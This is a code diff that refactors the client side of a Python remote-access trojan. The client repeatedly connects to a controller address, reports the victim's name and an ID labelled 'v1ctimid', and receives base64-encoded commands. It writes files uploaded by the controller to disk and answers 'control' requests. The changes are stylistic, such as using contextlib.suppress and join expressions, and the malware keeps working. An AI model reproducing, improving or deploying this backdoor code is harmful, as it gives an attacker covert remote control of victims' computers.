@@ -1,4 +1,5 @@
 import ast
+import contextlib
 import getpass
 import os
 import socket
@@ -28,19 +29,13 @@ TEMP = os.getenv("TEMP")
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
-    try:
+    with contextlib.suppress(ConnectionRefusedError):
         client.connect(FULLADDRESS)
         break
-    except ConnectionRefusedError:
-        pass
-
 client.send(f"{fullname}%{v1ctimid}".encode())
 
 def unsplit(list):
-    value = ""
-    for s in list:
-        value += s + " "
-    return value
+    return "".join(f"{s} " for s in list)
 
 def send(message):
     message = base64.b64encode(message)
@@ -50,10 +45,8 @@ def send(message):
         client.send(message)
 
 while True:
-    command = ""
     chunks = client.recv(HEADER).decode()
-    for i in range(int(chunks)):
-        command += client.recv(HEADER).decode()
+    command = "".join(client.recv(HEADER).decode() for _ in range(int(chunks)))
     command = base64.b64decode(command).decode()
     args = command.split(" ")
     print(args)
@@ -95,7 +88,7 @@ while True:
             filename = args[1].split("|")[0]
             filebytes = args[1].split("|")[1]
 
-            with open(os.getcwd()+f"\\{filename}",'wb+') as file:
+            with open(f"{os.getcwd()}\\{filename}", 'wb+') as file:
                 file.write(base64.b64decode(ast.literal_eval(filebytes)))
                 file.close()
             send(f"{Fore.GREEN}[{fullname}] [*] File succesfully saved{Fore.RESET}".encode())
@@ -106,15 +99,14 @@ while True:
         else:
             send(f"{Fore.RED}[{fullname}] [!] No such command found{Fore.RESET}".encode())
 
-    else:
-        if args[0] == "control":
-            if len(args) > 1:
-                c1d = args[1]
-                if c1d == v1ctimid:
-                    send(f"{Fore.GREEN}[{fullname}] [*] You are currently controlling {v1ctimid}".encode())
-                else:
-                    send(f"{Fore.GREEN}[{fullname}] [*] Command executed{Fore.RESET}".encode())
+    elif args[0] == "control":
+        if len(args) > 1:
+            c1d = args[1]
+            if c1d == v1ctimid:
+                send(f"{Fore.GREEN}[{fullname}] [*] You are currently controlling {v1ctimid}".encode())
             else:
-                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
+                send(f"{Fore.GREEN}[{fullname}] [*] Command executed{Fore.RESET}".encode())
         else:
-            send(f"{Fore.RED}[{fullname}] [!] No such command found or you are not controlling a client{Fore.RESET}".encode())
+            send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
+    else:
+        send(f"{Fore.RED}[{fullname}] [!] No such command found or you are not controlling a client{Fore.RESET}".encode())
